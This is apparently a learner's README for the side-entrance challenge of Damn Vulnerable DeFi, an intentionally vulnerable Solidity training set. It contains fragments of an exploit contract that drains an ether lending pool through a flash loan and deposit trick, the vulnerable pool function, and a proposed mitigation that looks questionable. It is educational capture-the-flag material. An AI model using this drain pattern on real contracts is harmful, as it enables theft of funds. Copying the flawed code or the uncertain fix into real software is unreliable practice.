![](cover.png)

**A set of challenges to learn offensive security of smart contracts in Ethereum.**

Featuring flash loans, price oracles, governance, NFTs, lending pools, smart contract wallets, timelocks, and more!

## Play

Visit [damnvulnerabledefi.xyz](https://damnvulnerabledefi.xyz)

## Help

For Q&A and troubleshooting running Damn Vulnerable DeFi, go [here](https://github.com/tinchoabbate/damn-vulnerable-defi/discussions/categories/support-q-a-troubleshooting).

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

DO NOT USE IN PRODUCTION.

## Comparison

command to run test -> npx hardhat test side-entrance.challenge.js About to use github linker and "@audit" tag to document stuff in .md file as mentioned here

---- before executing the code ------

I was unable to write report, because I dont have any clue how to write a good report.

** DO NOT READ FURTHER BELOW IF YOU HAVE NOT ALREADY TRIED SOLVING ** - highly recommended.

## Solution :

https://github.com/JayeshShukla/damn-vulnerable-defi/blob/207d65b756fc8a011089b8a1e4d85bbfae58e84c/contracts/truster/FaultyContract.sol

## Concepts Learned :

[here](https://medium.com/@JohnnyTime/damn-vulnerable-defi-v3-walkthrough-side-entrance-challenge-4-solution-b5ccbd64e1e7)

when comparing my code with the above url these are all the findings :

1. https://github.com/JayeshShukla/damn-vulnerable-defi/blob/207d65b756fc8a011089b8a1e4d85bbfae58e84c/contracts/side-entrance/FaultyContract.sol#L1-L7

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract FaultyContract is IFlashLoanEtherReceiver {
```

Instead of importing line "48", I could have created interface of SideEntranceLenderPool and used it.

2. https://github.com/JayeshShukla/damn-vulnerable-defi/blob/207d65b756fc8a011089b8a1e4d85bbfae58e84c/contracts/side-entrance/FaultyContract.sol#L16-L22

```solidity

    function firstTimer(uint256 _amount) external {
        pool.flashLoan(_amount);
        // withdraw will run after below "execute()" and "SideEntranceLenderPool's flashLoan()"
        pool.withdraw();
    }

```

"\_amount" in line 59 could be removed, because could have used "address(pool).balance":
learnt that one can use balance of any address in any contract.

3. https://github.com/JayeshShukla/damn-vulnerable-defi/blob/207d65b756fc8a011089b8a1e4d85bbfae58e84c/contracts/side-entrance/FaultyContract.sol#L23-L27

```solidity
  function execute() external payable {
        pool.deposit{value: address(this).balance}();
        // need to withdraw after repay check successfull in SideEntranceLenderPool's flashLoan
        // pool.withdraw(); -> cannot be here due to the above reason
    }
```

line 74: could have used "msg.value" instead address(this).balance : need more insight on this. That how exactly will that differ in the execution.

4. Also my execute function is not safe, so below code to be used to make is secure :

require(tx.origin == player); -> learnt new concept.

5. https://github.com/JayeshShukla/damn-vulnerable-defi/blob/207d65b756fc8a011089b8a1e4d85bbfae58e84c/contracts/side-entrance/FaultyContract.sol#L32-L46

```solidity
   receive() external payable {
        /**
         * @dev
         *      1) when written without "(bool success,) =", was giving me error as below :
         *      ** Return value of low-level calls not used. **
         *      chatgpt ->
         * In Solidity, when you use a low-level call like owner.call{value: address(this).balance}(""), the return value of the call is often ignored intentionally. This is because handling the return value of a low-level call can be complex and error-prone, especially if the target contract's function being called has a return value.
         *
         * However, Solidity compilers often issue a warning when the return value of such calls is ignored to alert developers that they might be missing important information. The warning message "Return value of low-level calls not used" is an indication that although the call was made, its result was not explicitly checked or utilized in the contract code.
         *
         * To handle the return value properly, you might consider using the try/catch mechanism introduced in Solidity 0.6.8 to catch any errors that might occur during the execution of the call. Here's an example of how you could use try/catch to handle errors and inspect the return value:
         */
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
```

the above code could be moved to, "firstTimer()" below pool.withdraw();

POSITIVE TAKE AWAY : The logic I applied is exactly same as given in the URL above. Need to make my contract safe too.

## Hack & How to stop it

https://github.com/JayeshShukla/damn-vulnerable-defi/blob/207d65b756fc8a011089b8a1e4d85bbfae58e84c/contracts/side-entrance/SideEntranceLenderPool.sol#L44-L52

```solidity
    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
```

in SideEntranceLenderPool addtional code at line 123 could be added :

```solidity

    delete balances[msg.sender];

```

this would make sure that balances mapping will be cleared for an address even if it tends to call deposit function inside the the flashloan function.
